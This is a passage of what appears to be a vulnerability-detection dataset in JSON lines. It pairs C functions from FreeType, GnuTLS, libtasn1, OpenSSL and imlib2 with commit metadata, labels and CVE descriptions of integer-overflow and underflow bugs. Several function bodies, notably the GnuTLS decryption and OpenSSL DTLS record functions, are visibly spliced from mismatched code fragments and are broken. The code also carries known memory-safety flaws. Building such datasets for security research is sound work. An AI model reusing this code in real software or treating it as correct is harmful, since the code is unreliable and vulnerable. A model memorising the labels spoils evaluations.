FT_TRACE4(( \" roll\\n\" ));\n\n            if ( count <= 0 )\n              count = 1;\n\n            args -= count;\n            if ( args < stack )\n              goto Stack_Underflow;\n\n            if ( idx >= 0 )\n            {\n              while ( idx > 0 )\n              {\n                FT_Fixed  tmp = args[count - 1];\n                FT_Int    i;\n\n\n                for ( i = count - 2; i >= 0; i-- )\n                  args[i + 1] = args[i];\n                args[0] = tmp;\n                idx--;\n              }\n            }\n            else\n            {\n              while ( idx < 0 )\n              {\n                FT_Fixed  tmp = args[0];\n                FT_Int    i;\n\n\n                for ( i = 0; i < count - 1; i++ )\n                  args[i] = args[i + 1];\n                args[count - 1] = tmp;\n                idx++;\n              }\n            }\n            args += count;\n          }\n          break;\n\n        case cff_op_dup:\n          FT_TRACE4(( \" dup\\n\" ));\n\n          args[1] = args[0];\n          args += 2;\n          break;\n\n        case cff_op_put:\n          {\n            FT_Fixed  val = args[0];\n            FT_Int    idx = (FT_Int)( args[1] >> 16 );\n\n\n            FT_TRACE4(( \" put\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              decoder->buildchar[idx] = val;\n          }\n          break;\n\n        case cff_op_get:\n          {\n            FT_Int    idx = (FT_Int)( args[0] >> 16 );\n            FT_Fixed  val = 0;\n\n\n            FT_TRACE4(( \" get\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              val = decoder->buildchar[idx];\n\n            args[0] = val;\n            args++;\n          }\n          break;\n\n        case cff_op_store:\n          FT_TRACE4(( \" store\\n\"));\n\n          goto Unimplemented;\n\n        case cff_op_load:\n          FT_TRACE4(( \" load\\n\" ));\n\n          goto Unimplemented;\n\n        case cff_op_dotsection:\n          /* this operator is deprecated and ignored by the parser */\n          FT_TRACE4(( \" dotsection\\n\" ));\n          break;\n\n        case cff_op_closepath:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" closepath (invalid op)\\n\" ));\n\n          args = stack;\n          break;\n\n        case cff_op_hsbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" hsbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[1] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = 0;\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y;\n          args = stack;\n          break;\n\n        case cff_op_sbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" sbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[2] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = args[1];\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_setcurrentpoint:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" setcurrentpoint (invalid op)\\n\" ));\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_callothersubr:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" callothersubr (invalid op)\\n\" ));\n\n          /* subsequent `pop' operands should add the arguments,       */\n           /* this is the implementation described for `unknown' other  */\n           /* subroutines in the Type1 spec.                            */\n           args -= 2 + ( args[-2] >> 16 );\n          if ( args < stack )\n            goto Stack_Underflow;\n           break;\n \n         case cff_op_pop:\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" pop (invalid op)\\n\" ));\n\n          args++;\n          break;\n\n        case cff_op_and:\n          {\n            FT_Fixed  cond = args[0] && args[1];\n\n\n            FT_TRACE4(( \" and\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_or:\n          {\n            FT_Fixed  cond = args[0] || args[1];\n\n\n            FT_TRACE4(( \" or\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_eq:\n          {\n            FT_Fixed  cond = !args[0];\n\n\n            FT_TRACE4(( \" eq\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_ifelse:\n          {\n            FT_Fixed  cond = ( args[2] <= args[3] );\n\n\n            FT_TRACE4(( \" ifelse\\n\" ));\n\n            if ( !cond )\n              args[0] = args[1];\n            args++;\n          }\n          break;\n\n        case cff_op_callsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->locals_bias );\n\n\n            FT_TRACE4(( \" callsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_locals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid local subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->locals[idx];\n            zone->limit  = decoder->locals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_callgsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->globals_bias );\n\n\n            FT_TRACE4(( \" callgsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_globals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid global subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->globals[idx];\n            zone->limit  = decoder->globals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_return:\n          FT_TRACE4(( \" return\\n\" ));\n\n          if ( decoder->zone <= decoder->zones )\n          {\n            FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                       \" unexpected return\\n\" ));\n            goto Syntax_Error;\n          }\n\n          decoder->zone--;\n          zone  = decoder->zone;\n          ip    = zone->cursor;\n          limit = zone->limit;\n          break;\n\n        default:\n        Unimplemented:\n          FT_ERROR(( \"Unimplemented opcode: %d\", ip[-1] ));\n\n          if ( ip[-1] == 12 )\n            FT_ERROR(( \" %d\", ip[0] ));\n          FT_ERROR(( \"\\n\" ));\n\n          return CFF_Err_Unimplemented_Feature;\n        }\n\n      decoder->top = args;\n\n      } /* general operator processing */\n\n    } /* while ip < limit */\n\n    FT_TRACE4(( \"..end..\\n\\n\" ));\n\n  Fail:\n    return error;\n\n  Syntax_Error:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: syntax error\\n\" ));\n    return CFF_Err_Invalid_File_Format;\n\n  Stack_Underflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack underflow\\n\" ));\n    return CFF_Err_Too_Few_Arguments;\n\n  Stack_Overflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack overflow\\n\" ));\n    return CFF_Err_Stack_Overflow;\n  }\n", "func_hash": 338965105723107567424020450442881213658, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2010-2497", "cve_desc": "Integer underflow in glyph handling in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2497"}
{"idx": 158208, "project": "savannah", "commit_id": "bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "commit_message": "None", "target": 0, "func": "_gnutls_ciphertext2compressed (gnutls_session_t session,\n\t\t\t       opaque * compress_data,\n\t\t\t       int compress_size,\n\t\t\t       gnutls_datum_t ciphertext, uint8_t type)\n{\n  uint8_t MAC[MAX_HASH_SIZE];\n  uint16_t c_length;\n  uint8_t pad;\n  int length;\n  digest_hd_st td;\n  uint16_t blocksize;\n  int ret, i, pad_failed = 0;\n  uint8_t major, minor;\n  gnutls_protocol_t ver;\n  int hash_size =\n    _gnutls_hash_get_algo_len (session->security_parameters.\n\t\t\t       read_mac_algorithm);\n\n  ver = gnutls_protocol_get_version (session);\n  minor = _gnutls_version_get_minor (ver);\n  major = _gnutls_version_get_major (ver);\n\n  blocksize = _gnutls_cipher_get_block_size (session->security_parameters.\n\t\t\t\t\t     read_bulk_cipher_algorithm);\n\n  /* initialize MAC \n   */\n  ret = mac_init (&td, session->security_parameters.read_mac_algorithm,\n\t\t session->connection_state.read_mac_secret.data,\n\t\t session->connection_state.read_mac_secret.size, ver);\n\n  if (ret < 0\n      && session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      gnutls_assert ();\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n  if (ciphertext.size < (unsigned) blocksize + hash_size)\n    {\n      _gnutls_record_log\n       (\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n        session, ciphertext.size, blocksize, hash_size);\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n \n   /* actual decryption (inplace)\n    */\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      length = ciphertext.size - hash_size;\n\n      break;\n    case CIPHER_BLOCK:\n      if ((ciphertext.size < blocksize) || (ciphertext.size % blocksize != 0))\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* ignore the IV in TLS 1.1.\n       */\n      if (session->security_parameters.version >= GNUTLS_TLS1_1)\n\t{\n\t  ciphertext.size -= blocksize;\n\t  ciphertext.data += blocksize;\n\n\t  if (ciphertext.size == 0)\n\t    {\n\t      gnutls_assert ();\n\t      return GNUTLS_E_DECRYPTION_FAILED;\n\t    }\n\t}\n\n      pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n\n      length = ciphertext.size - hash_size - pad;\n\n      if (pad > ciphertext.size - hash_size)\n\t{\n\t  gnutls_assert ();\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;  /* pad */\n \n      if ((int)pad > (int)ciphertext.size - hash_size)\n        {\n          gnutls_assert ();\n          /* We do not fail here. We check below for the\n       */\n      if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n          pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n        }\n \n      length = ciphertext.size - hash_size - pad;\n\n       /* Check the pading bytes (TLS 1.x)\n        */\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (length < 0)\n    length = 0;\n  c_length = _gnutls_conv_uint16 ((uint16_t) length);\n\n  /* Pass the type, version, length and compressed through\n   * MAC.\n   */\n  if (session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      _gnutls_hmac (&td,\n\t\t    UINT64DATA (session->connection_state.\n\t\t\t\tread_sequence_number), 8);\n\n      _gnutls_hmac (&td, &type, 1);\n      if (ver >= GNUTLS_TLS1)\n\t{\t\t\t/* TLS 1.x */\n\t  _gnutls_hmac (&td, &major, 1);\n\t  _gnutls_hmac (&td, &minor, 1);\n\t}\n      _gnutls_hmac (&td, &c_length, 2);\n\n      if (length > 0)\n\t_gnutls_hmac (&td, ciphertext.data, length);\n\n      mac_deinit (&td, MAC, ver);\n    }\n\n  /* This one was introduced to avoid a timing attack against the TLS\n   * 1.0 protocol.\n   */\n  if (pad_failed != 0)\n    return pad_failed;\n\n  /* HMAC was not the same. \n   */\n  if (memcmp (MAC, &ciphertext.data[length], hash_size) != 0)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* copy the decrypted stuff to compress_data.\n   */\n  if (compress_size < length)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECOMPRESSION_FAILED;\n    }\n  memcpy (compress_data, ciphertext.data, length);\n\n  return length;\n}\n", "func_hash": 170442923019523630056599453695509609781, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2008-1950", "cve_desc": "Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2008-1950"}
{"idx": 158228, "project": "savannah", "commit_id": "1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/libtasn1.git/commit/?id=1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "commit_message": "None", "target": 0, "func": "asn1_get_bit_der (const unsigned char *der, int der_len,\n \t\t  int *ret_len, unsigned char *str, int str_size,\n \t\t  int *bit_len)\n {\n  int len_len = 0, len_byte;\n \n   if (der_len <= 0)\n     return ASN1_GENERIC_ERROR;\n  len_byte = asn1_get_length_der (der, der_len, &len_len) - 1;\n  if (len_byte < 0)\n    return ASN1_DER_ERROR;\n \n   *ret_len = len_byte + len_len + 1;\n   *bit_len = len_byte * 8 - der[len_len];\n  \n  if (*bit_len <= 0)\n    return ASN1_DER_ERROR;\n \n   if (str_size >= len_byte)\n     memcpy (str, der + len_len + 1, len_byte);\n    }\n", "func_hash": 42928484385091622601624425880801270847, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-3468", "cve_desc": "The asn1_get_bit_der function in GNU Libtasn1 before 3.6 does not properly report an error when a negative bit length is identified, which allows context-dependent attackers to cause out-of-bounds access via crafted ASN.1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3468"}
{"idx": 158235, "project": "openssl", "commit_id": "1fb9fdc3027b27d8eb6a1e6a846435b070980770", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770", "commit_message": "Fix DTLS replay protection\n\nThe DTLS implementation provides some protection against replay attacks\nin accordance with RFC6347 section 4.1.2.6.\n\nA sliding \"window\" of valid record sequence numbers is maintained with\nthe \"right\" hand edge of the window set to the highest sequence number we\nhave received so far. Records that arrive that are off the \"left\" hand\nedge of the window are rejected. Records within the window are checked\nagainst a list of records received so far. If we already received it then\nwe also reject the new record.\n\nIf we have not already received the record, or the sequence number is off\nthe right hand edge of the window then we verify the MAC of the record.\nIf MAC verification fails then we discard the record. Otherwise we mark\nthe record as received. If the sequence number was off the right hand edge\nof the window, then we slide the window along so that the right hand edge\nis in line with the newly received sequence number.\n\nRecords may arrive for future epochs, i.e. a record from after a CCS being\nsent, can arrive before the CCS does if the packets get re-ordered. As we\nhave not yet received the CCS we are not yet in a position to decrypt or\nvalidate the MAC of those records. OpenSSL places those records on an\nunprocessed records queue. It additionally updates the window immediately,\neven though we have not yet verified the MAC. This will only occur if\ncurrently in a handshake/renegotiation.\n\nThis could be exploited by an attacker by sending a record for the next\nepoch (which does not have to decrypt or have a valid MAC), with a very\nlarge sequence number. This means the right hand edge of the window is\nmoved very far to the right, and all subsequent legitimate packets are\ndropped causing a denial of service.\n\nA similar effect can be achieved during the initial handshake. In this\ncase there is no MAC key negotiated yet. Therefore an attacker can send a\nmessage for the current epoch with a very large sequence number. The code\nwill process the record as normal. If the hanshake message sequence number\n(as opposed to the record sequence number that we have been talking about\nso far) is in the future then the injected message is bufferred to be\nhandled later, but the window is still updated. Therefore all subsequent\nlegitimate handshake records are dropped. This aspect is not considered a\nsecurity issue because there are many ways for an attacker to disrupt the\ninitial handshake and prevent it from completing successfully (e.g.\ninjection of a handshake message will cause the Finished MAC to fail and\nthe handshake to be aborted). This issue comes about as a result of trying\nto do replay protection, but having no integrity mechanism in place yet.\nDoes it even make sense to have replay protection in epoch 0? That\nissue isn't addressed here though.\n\nThis addressed an OCAP Audit issue.\n\nCVE-2016-2181\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 0, "func": "int dtls1_process_buffered_records(SSL *s)\n {\n     pitem *item;\n     SSL3_BUFFER *rb;\n    SSL3_RECORD *rr;\n    DTLS1_BITMAP *bitmap;\n    unsigned int is_next_epoch;\n    int replayok = 1;\n \n     item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n     if (item) {\n         /* Check if epoch is current. */\n         if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n            return 1;         /* Nothing to do. */\n\n        rr = RECORD_LAYER_get_rrec(&s->rlayer);\n \n         rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n \n             */\n            return 1;\n        }\n\n        /* Process all the records. */\n        while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n            dtls1_get_unprocessed_record(s);\n            if (!dtls1_process_record(s))\n                return (0);\n            if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n         /* Process all the records. */\n         while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n             dtls1_get_unprocessed_record(s);\n            bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);\n            if (bitmap == NULL) {\n                /*\n                 * Should not happen. This will only ever be NULL when the\n                 * current record is from a different epoch. But that cannot\n                 * be the case because we already checked the epoch above\n                 */\n                 SSLerr(SSL_F_DTLS1_PROCESS_BUFFERED_RECORDS,\n                        ERR_R_INTERNAL_ERROR);\n                 return 0;\n            }\n#ifndef OPENSSL_NO_SCTP\n            /* Only do replay check if no SCTP bio */\n            if (!BIO_dgram_is_sctp(SSL_get_rbio(s)))\n#endif\n            {\n                /*\n                 * Check whether this is a repeat, or aged record. We did this\n                 * check once already when we first received the record - but\n                 * we might have updated the window since then due to\n                 * records we subsequently processed.\n                 */\n                replayok = dtls1_record_replay_check(s, bitmap);\n            }\n\n            if (!replayok || !dtls1_process_record(s, bitmap)) {\n                /* dump this record */\n                rr->length = 0;\n                RECORD_LAYER_reset_packet_length(&s->rlayer);\n                continue;\n            }\n\n             if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) < 0)\n                return 0;\n         }\n     }\n \n *             here, anything else is handled by higher layers\n *     Application data protocol\n *             none of our business\n */\n     s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n     s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n \n    return 1;\n }\n", "func_hash": 309108341902743358947983564642524306672, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2181", "cve_desc": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2181"}
{"idx": 158253, "project": "openssl", "commit_id": "3f3582139fbb259a1c3cbb0a25236500a409bf26", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=3f3582139fbb259a1c3cbb0a25236500a409bf26", "commit_message": "Fix encrypt overflow\n\nAn overflow can occur in the EVP_EncryptUpdate function. If an attacker is\nable to supply very large amounts of input data after a previous call to\nEVP_EncryptUpdate with a partial block then a length check can overflow\nresulting in a heap corruption.\n\nFollowing an analysis of all OpenSSL internal usage of the\nEVP_EncryptUpdate function all usage is one of two forms.\n\nThe first form is like this:\nEVP_EncryptInit()\nEVP_EncryptUpdate()\n\ni.e. where the EVP_EncryptUpdate() call is known to be the first called\nfunction after an EVP_EncryptInit(), and therefore that specific call\nmust be safe.\n\nThe second form is where the length passed to EVP_EncryptUpdate() can be\nseen from the code to be some small value and therefore there is no\npossibility of an overflow.\n\nSince all instances are one of these two forms, I believe that there can\nbe no overflows in internal code due to this problem.\n\nIt should be noted that EVP_DecryptUpdate() can call EVP_EncryptUpdate()\nin certain code paths. Also EVP_CipherUpdate() is a synonym for\nEVP_EncryptUpdate(). Therefore I have checked all instances of these\ncalls too, and came to the same conclusion, i.e. there are no instances\nin internal usage where an overflow could occur.\n\nThis could still represent a security issue for end user code that calls\nthis function directly.\n\nCVE-2016-2106\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Tim Hudson <tjh@openssl.org>", "target": 0, "func": "int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j, bl;\n\n    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {\n        i = ctx->cipher->do_cipher(ctx, out, in, inl);\n        if (i < 0)\n            return 0;\n        else\n            *outl = i;\n        return 1;\n    }\n\n    if (inl <= 0) {\n        *outl = 0;\n        return inl == 0;\n    }\n\n    if (ctx->buf_len == 0 && (inl & (ctx->block_mask)) == 0) {\n        if (ctx->cipher->do_cipher(ctx, out, in, inl)) {\n            *outl = inl;\n            return 1;\n        } else {\n            *outl = 0;\n            return 0;\n        }\n    }\n    i = ctx->buf_len;\n     bl = ctx->cipher->block_size;\n     OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n     if (i != 0) {\n        if (bl - i > inl) {\n             memcpy(&(ctx->buf[i]), in, inl);\n             ctx->buf_len += inl;\n             *outl = 0;\n            return 1;\n        } else {\n            j = bl - i;\n            memcpy(&(ctx->buf[i]), in, j);\n            if (!ctx->cipher->do_cipher(ctx, out, ctx->buf, bl))\n                return 0;\n            inl -= j;\n            in += j;\n            out += bl;\n            *outl = bl;\n        }\n    } else\n        *outl = 0;\n    i = inl & (bl - 1);\n    inl -= i;\n    if (inl > 0) {\n        if (!ctx->cipher->do_cipher(ctx, out, in, inl))\n            return 0;\n        *outl += inl;\n    }\n\n    if (i != 0)\n        memcpy(ctx->buf, &(in[inl]), i);\n    ctx->buf_len = i;\n    return 1;\n}\n", "func_hash": 298263153019277204239133724403567540191, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2106", "cve_desc": "Integer overflow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2106"}
{"idx": 158254, "project": "openssl", "commit_id": "5b814481f3573fa9677f3a31ee51322e2a22ee6a", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=5b814481f3573fa9677f3a31ee51322e2a22ee6a", "commit_message": "Avoid overflow in EVP_EncodeUpdate\n\nAn overflow can occur in the EVP_EncodeUpdate function which is used for\nBase64 encoding of binary data. If an attacker is able to supply very large\namounts of input data then a length check can overflow resulting in a heap\ncorruption. Due to the very large amounts of data involved this will most\nlikely result in a crash.\n\nInternally to OpenSSL the EVP_EncodeUpdate function is primarly used by the\nPEM_write_bio* family of functions. These are mainly used within the\nOpenSSL command line applications, so any application which processes\ndata from an untrusted source and outputs it as a PEM file should be\nconsidered vulnerable to this issue.\n\nUser applications that call these APIs directly with large amounts of\nuntrusted data may also be vulnerable.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2105\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 0, "func": "void EVP_EncodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j;\n    unsigned int total = 0;\n\n    *outl = 0;\n     if (inl <= 0)\n         return;\n     OPENSSL_assert(ctx->length <= (int)sizeof(ctx->enc_data));\n    if (ctx->length - ctx->num > inl) {\n         memcpy(&(ctx->enc_data[ctx->num]), in, inl);\n         ctx->num += inl;\n         return;\n    }\n    if (ctx->num != 0) {\n        i = ctx->length - ctx->num;\n        memcpy(&(ctx->enc_data[ctx->num]), in, i);\n        in += i;\n        inl -= i;\n        j = EVP_EncodeBlock(out, ctx->enc_data, ctx->length);\n        ctx->num = 0;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total = j + 1;\n    }\n    while (inl >= ctx->length) {\n        j = EVP_EncodeBlock(out, in, ctx->length);\n        in += ctx->length;\n        inl -= ctx->length;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total += j + 1;\n    }\n    if (inl != 0)\n        memcpy(&(ctx->enc_data[0]), in, inl);\n    ctx->num = inl;\n    *outl = total;\n}\n", "func_hash": 94268136621199293469983375487658326449, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2105", "cve_desc": "Integer overflow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of binary data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2105"}
{"idx": 158314, "project": "enlightment", "commit_id": "c21beaf1780cf3ca291735ae7d58a3dde63277a2", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?h=v1.4.7&id=c21beaf1780cf3ca291735ae7d58a3dde63277a2", "commit_message": "None", "target": 0, "func": "load(ImlibImage * im, ImlibProgressFunction progress,\n     char progress_granularity, char immediate_load)\n{\n   int                 rc;\n   char                p = ' ', numbers = 3, count = 0;\n   int                 w = 0, h = 0, v = 255, c = 0;\n   char                buf[256];\n   FILE               *f = NULL;\n\n   if (im->data)\n      return 0;\n   f = fopen(im->real_file, \"rb\");\n   if (!f)\n      return 0;\n\n   /* can't use fgets(), because there might be\n    * binary data after the header and there\n    * needn't be a newline before the data, so\n    * no chance to distinguish between end of buffer\n    * and a binary 0.\n    */\n\n   /* read the header info */\n\n   rc = 0;                      /* Error */\n\n   c = fgetc(f);\n   if (c != 'P')\n      goto quit;\n\n   p = fgetc(f);\n   if (p == '1' || p == '4')\n      numbers = 2;              /* bitimages don't have max value */\n\n   if ((p < '1') || (p > '8'))\n      goto quit;\n\n   count = 0;\n   while (count < numbers)\n     {\n        c = fgetc(f);\n\n        if (c == EOF)\n           goto quit;\n\n        /* eat whitespace */\n        while (isspace(c))\n           c = fgetc(f);\n        /* if comment, eat that */\n        if (c == '#')\n          {\n             do\n                c = fgetc(f);\n             while (c != '\\n' && c != EOF);\n          }\n        /* no comment -> proceed */\n        else\n          {\n             int                 i = 0;\n\n             /* read numbers */\n             while (c != EOF && !isspace(c) && (i < 255))\n               {\n                  buf[i++] = c;\n                  c = fgetc(f);\n               }\n             if (i)\n               {\n                  buf[i] = 0;\n                  count++;\n                  switch (count)\n                    {\n                       /* width */\n                    case 1:\n                       w = atoi(buf);\n                       break;\n                       /* height */\n                    case 2:\n                       h = atoi(buf);\n                       break;\n                       /* max value, only for color and greyscale */\n                    case 3:\n                       v = atoi(buf);\n                       break;\n                    }\n               }\n          }\n     }\n   if ((v < 0) || (v > 255))\n      goto quit;\n\n   im->w = w;\n   im->h = h;\n   if (!IMAGE_DIMENSIONS_OK(w, h))\n      goto quit;\n\n   if (!im->format)\n     {\n        if (p == '8')\n           SET_FLAG(im->flags, F_HAS_ALPHA);\n        else\n           UNSET_FLAG(im->flags, F_HAS_ALPHA);\n        im->format = strdup(\"pnm\");\n     }\n\n   rc = 1;                      /* Ok */\n\n   if (((!im->data) && (im->loader)) || (immediate_load) || (progress))\n     {\n        DATA8              *data = NULL;        /* for the binary versions */\n        DATA8              *ptr = NULL;\n        int                *idata = NULL;       /* for the ASCII versions */\n        int                *iptr;\n        char                buf2[256];\n        DATA32             *ptr2;\n        int                 i, j, x, y, pl = 0;\n        char                pper = 0;\n\n        /* must set the im->data member before 